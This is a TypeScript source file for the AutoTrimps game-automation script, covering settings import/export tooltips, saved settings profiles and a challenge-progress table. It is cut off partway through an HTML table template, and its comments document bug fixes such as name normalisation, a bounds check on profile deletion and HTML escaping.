// TRUE TS (Phase 1 · #31): converted from the faithful port under strict.
// Was: relocated verbatim from legacy/modules/import-export.js.
// Settings import/export + profile GUI. Registers MODULES[import-export]. $settingsProfiles internal; ATrunning/script resolve to AutoTrimps2 globals.
import { debug, escapeHtml, safeSetItems, saveSettings } from './utils'

MODULES["import-export"] = {};
var $settingsProfiles: any;
export function settingsProfileMakeGUI() {
    var $settingsProfilesLabel = document.createElement("Label");
    $settingsProfilesLabel.id = 'settingsProfiles Label';
    $settingsProfilesLabel.innerHTML = "Settings Profile: ";
    if (game.options.menu.darkTheme.enabled == 2) $settingsProfilesLabel.setAttribute("style", "margin-left: 1.2vw; margin-right: 0.8vw; font-size: 0.8vw;");
    else $settingsProfilesLabel.setAttribute("style", "margin-left: 1.2vw; margin-right: 0.8vw; font-size: 0.8vw;");
    $settingsProfiles = document.createElement("select");
    $settingsProfiles.id = 'settingsProfiles';
    $settingsProfiles.setAttribute('class', 'noselect');
    $settingsProfiles.setAttribute('onchange', 'settingsProfileDropdownHandler()');
    var oldstyle = 'text-align: center; width: 160px; font-size: 1.0vw;';
    if(game.options.menu.darkTheme.enabled != 2) $settingsProfiles.setAttribute("style", oldstyle + " color: black;");
    else $settingsProfiles.setAttribute('style', oldstyle);
    //Create settings profile selection dropdown
    var $settingsProfilesButton = document.createElement("Button");
    $settingsProfilesButton.id = 'settingsProfiles Button';
    $settingsProfilesButton.setAttribute('class', 'btn btn-info');
    $settingsProfilesButton.innerHTML = "&lt;Delete Profile";
    $settingsProfilesButton.setAttribute('style', 'margin-left: 0.5vw; margin-right: 0.5vw; font-size: 0.8vw;');
    $settingsProfilesButton.setAttribute('onclick','onDeleteProfileHandler()');
    //populate with a Default (read default settings):
    var innerhtml = "<option id='customProfileCurrent'>Current</option>";
    //populate with a Default (read default settings):
    innerhtml += "<option id='customProfileDefault'>Reset to Default</option>";
    //Append a 2nd default item named "Save New..." and have it tied to a write function();
    innerhtml += "<option id='customProfileNew'>Save New...</option>";
    //dont forget to populate the rest of it with stored items:
    $settingsProfiles.innerHTML = innerhtml;    
    //Add the $settingsProfiles dropdown to UI
    var $ietab = document.getElementById('Import Export');
    if ($ietab == null) return;
    //Any ERRORs here are caused by incorrect order loading of script and you should reload until its gone.(for now)
    $ietab.insertBefore($settingsProfilesLabel, $ietab.childNodes[1]);
    $ietab.insertBefore($settingsProfiles, $ietab.childNodes[2]);
    $ietab.insertBefore($settingsProfilesButton, $ietab.childNodes[3]);
    // #72: populate the dropdown HERE, now that it exists. The module-eval call at the bottom of this
    // file runs before createTabs() has built the Import/Export tab, so it early-returns at the
    // `$settingsProfiles == null` guard and the list stays empty. Chaining it to the builder keeps the
    // two ordered by construction: whoever renders the control also fills it.
    initializeSettingsProfiles();
}   //self-executes at the bottom of the file.

//Populate dropdown menu with list of AT SettingsProfiles
export function initializeSettingsProfiles() {
    if ($settingsProfiles == null) return;
    //load the old data in:
    var loadLastProfiles = localStorage.getItem('ATSelectedSettingsProfile');
    var oldpresets = loadLastProfiles ? JSON.parse(loadLastProfiles) : new Array(); //load the import.
    oldpresets.forEach(function(elem: any){
        //Populate dropdown menu to reflect new name:
        let optionElementReference = new Option(elem.name);
        optionElementReference.id = 'customProfileRead';
        $settingsProfiles.add(optionElementReference);
    });
    $settingsProfiles.selectedIndex = 0;
}

//This switches into the new profile when the dropdown is selected.
//it is the "onchange" handler of the settingsProfiles dropdown
//Asks them do a confirmation check tooltip first. The
export function settingsProfileDropdownHandler() {
    if ($settingsProfiles == null) return;
    var index = $settingsProfiles.selectedIndex;
    var id = $settingsProfiles.options[index].id;
    //Current: placeholder.
    if (id == 'customProfileCurrent')
        return;
    cancelTooltip();
//Default: simply calls Reset To Default:
    if (id == 'customProfileDefault')
        //calls a tooltip then resetAutoTrimps() below
        ImportExportTooltip('ResetDefaultSettingsProfiles');
//Save new...: asks a name and saves new profile
    else if (id == 'customProfileNew')
        //calls a tooltip then nameAndSaveNewProfile() below
        ImportExportTooltip('NameSettingsProfiles');
//Reads the existing profile name and switches into it.
    else if (id == 'customProfileRead')
        //calls a tooltip then confirmedSwitchNow() below
        ImportExportTooltip('ReadSettingsProfiles');
    //NOPE.XWait 200ms for everything to reset and then re-select the old index.
    //setTimeout(function(){ settingsProfiles.selectedIndex = index;} ,200);
    return;
}

export function confirmedSwitchNow() {
    if ($settingsProfiles == null) return;
    var index = $settingsProfiles.selectedIndex;
    var profname = $settingsProfiles.options[index].text;
    //load the stored profiles from browser
    var loadLastProfiles = JSON.parse(localStorage.getItem('ATSelectedSettingsProfile')!);
    if (loadLastProfiles != null) {
        var results = loadLastProfiles.filter(function(elem: any,_i: any){
            return elem.name == profname;
        });
        if (results.length > 0) {
            resetAutoTrimps(results[0].data,profname);
            debug("Successfully loaded existing profile: " + profname, "profile");
        } else {
            // #255 — this branch used to be absent, so a profile whose stored name did not match its
            // dropdown label (see normalizeProfileName) made the Confirm button do NOTHING, with no
            // error, permanently. Names are normalised at the save seam now, so a miss here means the
            // store and the dropdown have genuinely desynchronised — say so rather than no-op.
            debug("Could not find a saved profile named: " + profname, "profile");
            ImportExportTooltip('message', 'No saved settings profile named "' + profname + '" was found.');
        }
    }
}

// #255 — a profile name has to survive a round trip through the <select>. It is PERSISTED raw by
// nameAndSaveNewProfile and READ BACK as `$settingsProfiles.options[index].text` by
// confirmedSwitchNow (:96), and HTMLOptionElement.text is spec'd to strip and collapse ASCII
// whitespace. So "Zone 60 " went into localStorage with its trailing space and came back out
// without it, `elem.name == profname` matched nothing, and the profile became permanently
// unloadable — one trailing space was enough. Normalising at the save seam makes the two sides the
// same string by construction, which is the only fix that does not leave a second copy of the rule.
// ASCII whitespace per the HTML spec is TAB / LF / FF / CR / SPACE.
function normalizeProfileName(raw: any): string {
    return String(raw).replace(/[\t\n\f\r ]+/g, ' ').trim();
}

//called by ImportExportTooltip('NameSettingsProfiles')
export function nameAndSaveNewProfile() {
    //read the name in from tooltip
    try {
        var profname = normalizeProfileName(byId("setSettingsNameTooltip").value);
    } catch (err: any) {
        debug("Error in naming, the string is bad." + err.message, "profile");
        return;
    }
    // #255 — WAS `if (profname == null)`. A textarea's `.value` is ALWAYS a string and `'' == null`
    // is false, so this guard could never fire and an empty (or whitespace-only) name was saved as a
    // blank row in the dropdown. Test the string, not null.
    if (profname === '') {
        debug("Error in naming, the string is empty.", "profile");
        ImportExportTooltip('message', 'A settings profile needs a name — nothing was saved.');
        return;
    }
    //load the old data in,
    var loadLastProfiles = localStorage.getItem('ATSelectedSettingsProfile');
    var oldpresets = loadLastProfiles ? JSON.parse(loadLastProfiles) : new Array(); //load the import.
    // #255 — confirmedSwitchNow resolves a selection BY NAME and takes `results[0]`, so a second
    // profile sharing a name can never be loaded: it is shadowed for as long as the first exists,
    // and once the first is deleted the survivor's dropdown row matches nothing. Uniqueness is not
    // a nicety here, it is what makes the by-name lookup a function of the user's selection.
    if (oldpresets.some(function(elem: any){ return elem.name === profname; })) {
        debug("A settings profile named '" + profname + "' already exists.", "profile");
        ImportExportTooltip('message', 'A settings profile named "' + profname + '" already exists — pick another name.');
        return;
    }
    var profile = {
        name: profname,
        data: JSON.parse(serializeSettings())
    }
    //rewrite the updated array in
    var presetlists = [profile];
    //add the two arrays together, string them, and store them.
    safeSetItems('ATSelectedSettingsProfile', JSON.stringify(oldpresets.concat(presetlists)));
    debug("Successfully created new profile: " + profile.name, "profile");
    ImportExportTooltip('message', 'Successfully created new profile: ' + profile.name);
    //Update dropdown menu to reflect new name:
    let optionElementReference = new Option(profile.name);
    optionElementReference.id = 'customProfileRead';
    if ($settingsProfiles == null) return;
    $settingsProfiles.add(optionElementReference);
    $settingsProfiles.selectedIndex = $settingsProfiles.length-1;
}

// #211 — the first three <option>s are fixed commands, not saved profiles: "Current" (the BOOT
// selection, :62), "Reset to Default" (where the factory-reset confirm parks the dropdown) and
// "Save New…". Only indices >= 3 map onto the stored array. This predicate is the single place that
// knows it; both the confirm gate and the delete itself read it, so they cannot disagree.
function selectedProfileIndex(): number {
    if ($settingsProfiles == null) return -1;
    var index = $settingsProfiles.selectedIndex;
    return index >= 3 ? index : -1;
}

//event handler for profile delete button - confirmation check tooltip
export function onDeleteProfileHandler() {
    // #211 — do not even offer the confirm when the selection is one of the three fixed options.
    // The confirm text splices in `settingsProfiles.value`, so at the boot selection it read "You
    // are about to delete the Current settings profile" — which parses as "the profile you are
    // currently on" and actively fails to warn that something else is about to be destroyed.
    if (selectedProfileIndex() < 0) {
        ImportExportTooltip('message', 'Select a saved settings profile in the dropdown first — there is nothing to delete.');
        return;
    }
    ImportExportTooltip('DeleteSettingsProfiles');  //calls a tooltip then onDeleteProfile() below
}
//Delete Profile runs after.
export function onDeleteProfile() {
    if ($settingsProfiles == null) return;
    // #211 — WAS: `var index = selectedIndex` … `var target = (index-3); oldpresets.splice(target, 1)`
    // with no lower bound. Array.prototype.splice counts a NEGATIVE start from the END, so deleting
    // while a fixed option was selected removed a profile the user never picked (at the boot
    // selection, with 5 saved profiles, it destroyed the third one) and the removal was unrecoverable
    // — safeSetItems overwrites the key in the same call. #85 predicted this exact regression when
    // #72 revived the GUI; the guard never landed. Defence in depth: onDeleteProfileHandler already
    // refuses to raise the confirm, but this function is published on globalThis and reachable from
    // an inline onclick, so it validates its own precondition rather than trusting the caller.
    var index = selectedProfileIndex();
    if (index < 0) {
        debug("No settings profile is selected — nothing was deleted.", "profile");
        return;
    }
    //Remove the option
    $settingsProfiles.options.remove(index);
    //Stay on the same index (becomes next item) - so we dont have to Toggle into a new profile again and can keep chain deleting.
    $settingsProfiles.selectedIndex = (index > ($settingsProfiles.length-1)) ? $settingsProfiles.length-1 : index;
    //load the old data in:
    var loadLastProfiles = localStorage.getItem('ATSelectedSettingsProfile');
    var oldpresets = loadLastProfiles ? JSON.parse(loadLastProfiles) : new Array(); //load the import.
    //rewrite the updated array in. string them, and store them.
    var target = (index-3); //subtract the 3 default choices out
    oldpresets.splice(target, 1);
    safeSetItems('ATSelectedSettingsProfile', JSON.stringify(oldpresets));
    debug("Successfully deleted profile #: " + target, "profile");
}

// escapeHtml moved to utils.ts under #235 — the cleanup preview below was the first caller, but
// settings-engine and settings-visibility need the identical rule and a second copy of an escaping
// rule is how #110 happened twice.

export function ImportExportTooltip(what: any, event?: any) {
    if (game.global.lockTooltip)
        return;
    var $elem = document.getElementById("tooltipDiv")!;
    swapClass("tooltipExtra", "tooltipExtraNone", $elem);
    var ondisplay = null;
    // #235 — initialised, because it is no longer `any`. `tooltipText = event` (the 'message' branch)
    // was the one untyped assignment in this function, and it widened the variable to `any`, which is
    // what let an unmatched `what` fall through to `tipText.innerHTML = undefined` — i.e. a tooltip
    // reading the literal word "undefined". Escaping that branch made tsc see `string | undefined`
    // and say so. Every shipped caller matches a branch, so this is a belt-and-braces default.
    var tooltipText = "";
    var costText = "";
    var titleText = what;
    if (what == "ExportAutoTrimps") {
        tooltipText = "This is your AUTOTRIMPS save string. There are many like it but this one is yours. Save this save somewhere safe so you can save time next time. <br/><br/><textarea id='exportArea' style='width: 100%' rows='5'>" + escapeHtml(serializeSettings()) + "</textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip()'>Got it</div>";
        if (document.queryCommandSupported('copy')) {
            costText += "<div id='clipBoardBtn' class='btn btn-success'>Copy to Clipboard</div>";
            ondisplay = function() {
                byId('exportArea').select();
                byId<HTMLElement>('clipBoardBtn').addEventListener('click', function(_event: any) {
                    byId('exportArea').select();
                    try {
                        document.execCommand('copy');
                    } catch (err: any) {
                        byId<HTMLElement>('clipBoardBtn').innerHTML = "Error, not copied";
                    }
                });
            };
        } else {
            ondisplay = function() {
                byId('exportArea').select();
            };
        }
        costText += "</div>";
    } else if (what == "Export550") {
        tooltipText = "This is your AUTOTRIMPS z550+ save string. Use this string to import the settings. <br/><br/><textarea id='exportArea' style='width: 100%' rows='5'>" + escapeHtml(serializeSettings550()) + "</textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip()'>Got it</div>";
        if (document.queryCommandSupported('copy')) {
            costText += "<div id='clipBoardBtn' class='btn btn-success'>Copy to Clipboard</div>";
            ondisplay = function() {
                byId('exportArea').select();
                byId<HTMLElement>('clipBoardBtn').addEventListener('click', function(_event: any) {
                    byId('exportArea').select();
                    try {
                        document.execCommand('copy');
                    } catch (err: any) {
                        byId<HTMLElement>('clipBoardBtn').innerHTML = "Error, not copied";
                    }
                });
            };
        }
    } else if (what == "Export60") {
        tooltipText = "This is your AUTOTRIMPS z60 save string. Use this string to import the settings. <br/><br/><textarea id='exportArea' style='width: 100%' rows='5'>" + escapeHtml(serializeSettings60()) + "</textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip()'>Got it</div>";
        if (document.queryCommandSupported('copy')) {
            costText += "<div id='clipBoardBtn' class='btn btn-success'>Copy to Clipboard</div>";
            ondisplay = function() {
                byId('exportArea').select();
                byId<HTMLElement>('clipBoardBtn').addEventListener('click', function(_event: any) {
                    byId('exportArea').select();
                    try {
                        document.execCommand('copy');
                    } catch (err: any) {
                        byId<HTMLElement>('clipBoardBtn').innerHTML = "Error, not copied";
                    }
                });
            };
    } else {
            ondisplay = function() {
                byId('exportArea').select();
            };
        }
        costText += "</div>";
    } else if (what == "ImportAutoTrimps") {
        tooltipText = "Import your AUTOTRIMPS save string! It'll be fine, I promise.<br/><br/><textarea id='importBox' style='width: 100%' rows='5'></textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip(); loadAutoTrimps();'>Import</div><div class='btn btn-info' onclick='cancelTooltip()'>Cancel</div></div>";
        ondisplay = function() {
            byId('importBox').focus();
        };
    } else if (what == "spireImport") {
        tooltipText = "Import your SPIRE string! <br/><br/><textarea id='importBox' style='width: 100%' rows='5'></textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip(); tdStringCode2();'>Import</div><div class='btn btn-info' onclick='cancelTooltip()'>Cancel</div></div>";
        ondisplay = function() {
            byId('importBox').focus();
        };
    } else if (what == "CleanupAutoTrimps") {
        // #76(A): this branch USED TO CALL cleanupAutoTrimps() right here — the settings file was
        // destroyed by merely LOOKING at the tooltip, before the user could confirm anything, and the
        // copy then told them to refresh, which is the step that made the loss permanent. Now the
        // render is pure (cleanupCandidates()) and the delete needs an explicit click that names the
        // count. Key names come from the user's localStorage, so they are escaped before innerHTML.
        var stale = cleanupCandidates();
        if (stale.length === 0) {
            titleText = "Cleanup Saved Settings";
            tooltipText = "Nothing to clean up — every key in your saved settings file is a setting this version of AutoTrimps still defines.";
            costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
        } else {
            titleText = "<b>WARNING:</b> Delete " + stale.length + " saved setting(s)?";
            tooltipText = "These <b>" + stale.length + "</b> key(s) in your saved settings file are not defined by this version of AutoTrimps (leftovers from an older version). Deleting them is <b>permanent</b> and cannot be undone.<br/><br/><textarea readonly style='width: 100%' rows='5'>" + escapeHtml(stale.join('\n')) + "</textarea><br/>Your " + (Object.keys(autoTrimpSettings).length - stale.length) + " live settings are NOT touched.";
            costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-danger' onclick='cancelTooltip(); cleanupAutoTrimps(); saveSettings();'>Delete " + stale.length + "</div><div style='margin-left: 15%' class='btn btn-info' onclick='cancelTooltip();'>Cancel</div></div>";
        }
    } else if (what == "ExportModuleVars") {
        tooltipText = "These are your custom Variables. The defaults have not been included, only what you have set... <br/><br/><textarea id='exportArea' style='width: 100%' rows='5'>" + exportModuleVars() + "</textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip()'>Got it</div>";
        if (document.queryCommandSupported('copy')) {
            costText += "<div id='clipBoardBtn' class='btn btn-success'>Copy to Clipboard</div>";
            ondisplay = function() {
                byId('exportArea').select();
                byId<HTMLElement>('clipBoardBtn').addEventListener('click', function(_event: any) {
                    byId('exportArea').select();
                    try {
                        document.execCommand('copy');
                    } catch (err: any) {
                        byId<HTMLElement>('clipBoardBtn').innerHTML = "Error, not copied";
                    }
                });
            };
        } else {
            ondisplay = function() {
                byId('exportArea').select();
            };
        }
        costText += "</div>";
    } else if (what == "ImportModuleVars") {
        // #242 — this copy USED TO END "…and save locally for future use between refreshes", and both
        // halves of that promise were false. Nothing anywhere reads `localStorage.storedMODULES` back:
        // `grep -rn "getItem(" src/` returns twenty sites and none is this key, and the only readers in
        // the repo are assertions checking what was just written. So MODULE overrides do not survive a
        // reload — and worse, nine seconds after the next boot guiLoop (main-loop.ts:597) rewrites the
        // key from the live diff, erasing the record of what the user had set.
        //
        // Fixing the SENTENCE rather than the mechanism is deliberate. The two real options are a
        // boot-time restore or ripping the persistence out, and both are larger than they look:
        //   · a restore must not naively replay the whole diff — settings-visibility recomputes
        //     MODULES.maps.preferGardens from PreferMetal every guiLoop tick, so the persisted blob is
        //     part user config and part derived state
        //   · deleting the write cascades into the five unmounted tooltip branches, which are the only
        //     callers of importModuleVars / resetModuleVars / exportModuleVars — i.e. it would orphan
        //     parseModuleVars, the hardened importer #76B built to replace a dynamic-code sink, and the
        //     four test files that guard #71/#71a/#76B against regression
        // A tooltip that lies is the part that costs a user something today, so that is what is fixed
        // here. The mechanism decision is filed separately with the preferGardens hazard recorded.
        //
        // Note this branch is ALSO unreachable from the UI: nothing mounts an 'ImportModuleVars'
        // control, so it is console-only (tests/nets/dom-ids.test.ts:278 already baselines the sibling
        // ATModuleListDropdown as dead for the same reason).
        tooltipText = "Enter your Autotrimps MODULE variable settings to load. These apply to the current session only — they are NOT restored after a refresh:<br/><br/><textarea id='importBox' style='width: 100%' rows='5'></textarea>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip(); importModuleVars();'>Import</div><div class='btn btn-info' onclick='cancelTooltip()'>Cancel</div></div>";
        ondisplay = function() {
            byId('importBox').focus();
        };
    } else if (what == "ATModuleLoad") {
        var mods = byId<HTMLSelectElement>('ATModuleListDropdown');
        var modnames = "";
        for (var script in mods.selectedOptions) {
            var $item = mods.selectedOptions[script];
            if ($item.value != null) {
                ATscriptLoad(modulepath, $item.value);
                modnames += $item.value + " ";
            }
        }
        tooltipText = "Autotrimps - Loaded the MODULE .JS File(s): " + modnames;
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
    } else if (what == "ATModuleUnload") {
        var mods = byId<HTMLSelectElement>('ATModuleListDropdown');
        var modnames = "";
        for (var script in mods.selectedOptions) {
            var $item = mods.selectedOptions[script];
            if ($item.value != null) {
                ATscriptUnload($item.value);
                modnames += $item.value + " ";
            }            
        }
        tooltipText = "Autotrimps - UnLoaded the MODULE .JS File(s): " + modnames;
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
    } else if (what == "ResetModuleVars") {
        resetModuleVars();
        tooltipText = "Autotrimps MODULE variable settings have been successfully reset to its defaults!";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>OK</div></div>";
    } else if (what == 'MagmiteExplain') {
        tooltipText = "<img src='" + basepath + "mi.png'>";
        costText = "<div class='maxCenter'><div id='confirmTooltipBtn' class='btn btn-info' onclick='cancelTooltip();'>Thats all the help you get.</div></div>";
    } else if (what == 'c2table') {
        var c2list: Record<string, any> = {
    Size: {
        number: 1,
        percent: getIndividualSquaredReward('Size') + '%',
        zone: game.c2.Size,
        percentzone: (100 * (game.c2.Size / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Slow: {
        number: 2,
        percent: getIndividualSquaredReward('Slow') + '%',
        zone: game.c2.Slow,
        percentzone: (100 * (game.c2.Slow / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Watch: {
        number: 3,
        percent: getIndividualSquaredReward('Watch') + '%',
        zone: game.c2.Watch,
        percentzone: (100 * (game.c2.Watch / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Discipline: {
        number: 4,
        percent: getIndividualSquaredReward('Discipline') + '%',
        zone: game.c2.Discipline,
        percentzone: (100 * (game.c2.Discipline / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Balance: {
        number: 5,
        percent: getIndividualSquaredReward('Balance') + '%',
        zone: game.c2.Balance,
        percentzone: (100 * (game.c2.Balance / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Meditate: {
        number: 6,
        percent: getIndividualSquaredReward('Meditate') + '%',
        zone: game.c2.Meditate,
        percentzone: (100 * (game.c2.Meditate / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Metal: {
        number: 7,
        percent: getIndividualSquaredReward('Metal') + '%',
        zone: game.c2.Metal,
        percentzone: (100 * (game.c2.Metal / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Lead: {
        number: 8,
        percent: getIndividualSquaredReward('Lead') + '%',
        zone: game.c2.Lead,
        percentzone: (100 * (game.c2.Lead / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Nom: {
        number: 9,
        percent: getIndividualSquaredReward('Nom') + '%',
        zone: game.c2.Nom,
        percentzone: (100 * (game.c2.Nom / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Toxicity: {
        number: 10,
        percent: getIndividualSquaredReward('Toxicity') + '%',
        zone: game.c2.Toxicity,
        percentzone: (100 * (game.c2.Toxicity / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Electricity: {
        number: 11,
        percent: getIndividualSquaredReward('Electricity') + '%',
        zone: game.c2.Electricity,
        percentzone: (100 * (game.c2.Electricity / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Coordinate: {
        number: 12,
        percent: getIndividualSquaredReward('Coordinate') + '%',
        zone: game.c2.Coordinate,
        percentzone: (100 * (game.c2.Coordinate / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Trimp: {
        number: 13,
        percent: getIndividualSquaredReward('Trimp') + '%',
        zone: game.c2.Trimp,
        percentzone: (100 * (game.c2.Trimp / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Obliterated: {
        number: 14,
        percent: getIndividualSquaredReward('Obliterated') + '%',
        zone: game.c2.Obliterated,
        percentzone: (100 * (game.c2.Obliterated / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Eradicated: {
        number: 15,
        percent: getIndividualSquaredReward('Eradicated') + '%',
        zone: game.c2.Eradicated,
        percentzone: (100 * (game.c2.Eradicated / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Mapology: {
        number: 16,
        percent: getIndividualSquaredReward('Mapology') + '%',
        zone: game.c2.Mapology,
        percentzone: (100 * (game.c2.Mapology / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Trapper: {
        number: 17,
        percent: getIndividualSquaredReward('Trapper') + '%',
        zone: game.c2.Trapper,
        percentzone: (100 * (game.c2.Trapper / (game.global.highestLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    C3s: {
        number: 'Difficulty',
        percent: '%C3',
        zone: 'Zone',
        percentzone: '%HZE',
        color: 0
    },
    Unbalance: {
        number: 18,
        percent: getIndividualSquaredReward('Unbalance') + '%',
        zone: game.c2.Unbalance,
        percentzone: (100 * (game.c2.Unbalance / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Unlucky: {
        number: 19,
        percent: getIndividualSquaredReward('Unlucky') + '%',
        zone: game.c2.Unlucky,
        percentzone: (100 * (game.c2.Unlucky / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Duel: {
        number: 20,
        percent: getIndividualSquaredReward('Duel') + '%',
        zone: game.c2.Duel,
        percentzone: (100 * (game.c2.Duel / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Storm: {
        number: 21,
        percent: getIndividualSquaredReward('Storm') + '%',
        zone: game.c2.Storm,
        percentzone: (100 * (game.c2.Storm / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Transmute: {
        number: 22,
        percent: getIndividualSquaredReward('Transmute') + '%',
        zone: game.c2.Transmute,
        percentzone: (100 * (game.c2.Transmute / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Quest: {
        number: 23,
        percent: getIndividualSquaredReward('Quest') + '%',
        zone: game.c2.Quest,
        percentzone: (100 * (game.c2.Quest / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Downsize: {
        number: 24,
        percent: getIndividualSquaredReward('Downsize') + '%',
        zone: game.c2.Downsize,
        percentzone: (100 * (game.c2.Downsize / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Smithless: {
        number: 25,
        percent: getIndividualSquaredReward('Smithless') + '%',
        zone: game.c2.Smithless,
        percentzone: (100 * (game.c2.Smithless / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Glass: {
        number: 26,
        percent: getIndividualSquaredReward('Glass') + '%',
        zone: game.c2.Glass,
        percentzone: (100 * (game.c2.Glass / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Trappapalooza: {
        number: 27,
        percent: getIndividualSquaredReward('Trappapalooza') + '%',
        zone: game.c2.Trappapalooza,
        percentzone: (100 * (game.c2.Trappapalooza / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Berserk: {
        number: 28,
        percent: getIndividualSquaredReward('Berserk') + '%',
        zone: game.c2.Berserk,
        percentzone: (100 * (game.c2.Berserk / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    },
    Wither: {
        number: 29,
        percent: getIndividualSquaredReward('Wither') + '%',
        zone: game.c2.Wither,
        percentzone: (100 * (game.c2.Wither / (game.global.highestRadonLevelCleared + 1))).toFixed(2) + '%',
        color: 0
    }
    
};
        function c2listcolor(){
			function a(b: any,c: any,d: any){
				var e=100*(game.c2[b]/(game.global.highestLevelCleared+1));
				c2list[b].color=e>=c?"LIMEGREEN":e<c&&e>=d?"GOLD":e<d&&1<=e?"#de0000":"DEEPSKYBLUE"
			}
				Object.keys(c2list).forEach(function(b){
						null!=game.c2[b]&&("Coordinate"===b?a(b,45,38):"Trimp"===b?a(b,45,35):"Obliterated"===b?a(b,25,20):"Eradicated"===b?a(b,14,10):"Mapology"===b?a(b,90,80):"Trapper"===b?a(b,85,75):a(b,95,85))
				})
		}
       function Rc2listcolor(){
			function a(b: any,c: any,d: any){
				var e=100*(game.c2[b]/(game.global.highestRadonLevelCleared+1));
				c2list[b].color=e>=c?"LIMEGREEN":e<c&&e>=d?"GOLD":e<d&&1<=e?"#de0000":"DEEPSKYBLUE";
			}
				Object.keys(c2list).forEach(function(b){
						if (game.c2[b] != null) {
							if (b == "Unbalance")
								a(b,90,80);
							else if (b == "Unlucky")
								a(b,97,92);
							else if (b == "Duel")
								a(b,90,80);
							else if (b == "Transmute")
								a(b,90,80);
							else if (b == "Quest")
								a(b,90,80);
							else if (b == "Downsize")
								a(b,85,75);
							else if (b == "Trappapalooza")
								a(b,85,75);
							else if (b == "Wither")
								a(b,85,75);
							else if (b == "Storm")
								a(b,90,80);
							else if (b == "Berserk")
								a(b,85,75);
							else if (b == "Glass")
								a(b,90,80);
							else if (b == "Smithless")
								a(b,90,80);
						}
				});
		} 
		c2listcolor();
	        Rc2listcolor();
        tooltipText = `<div class='litScroll'>
    <table class='bdTableSm table table-striped'>
        <tbody>
            <tr>
                <td>Name</td>
                <td>Difficulty</td>
                <td>%C2</td>
                <td>Zone</td>
                <td>%HZE</td>
            </tr>
            <tr>
                <td>Size</td>
                <td>` + c2list.Size.number + `</td>
                <td>` + c2list.Size.percent + `</td>
                <td>` + c2list.Size.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Size.color + `>` + c2list.Size.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Slow</td>
                <td>` + c2list.Slow.number + `</td>
                <td>` + c2list.Slow.percent + `</td>
                <td>` + c2list.Slow.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Slow.color + `>` + c2list.Slow.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Watch</td>
                <td>` + c2list.Watch.number + `</td>
                <td>` + c2list.Watch.percent + `</td>
                <td>` + c2list.Watch.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Watch.color + `>` + c2list.Watch.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Discipline</td>
                <td>` + c2list.Discipline.number + `</td>
                <td>` + c2list.Discipline.percent + `</td>
                <td>` + c2list.Discipline.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Discipline.color + `>` + c2list.Discipline.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Balance</td>
                <td>` + c2list.Balance.number + `</td>
                <td>` + c2list.Balance.percent + `</td>
                <td>` + c2list.Balance.zone + `</td>
                <td bgcolor='black'>
                    <font color=` + c2list.Balance.color + `>` + c2list.Balance.percentzone + `
                </td>
            </tr>
            <tr>
                <td>Meditate</td>
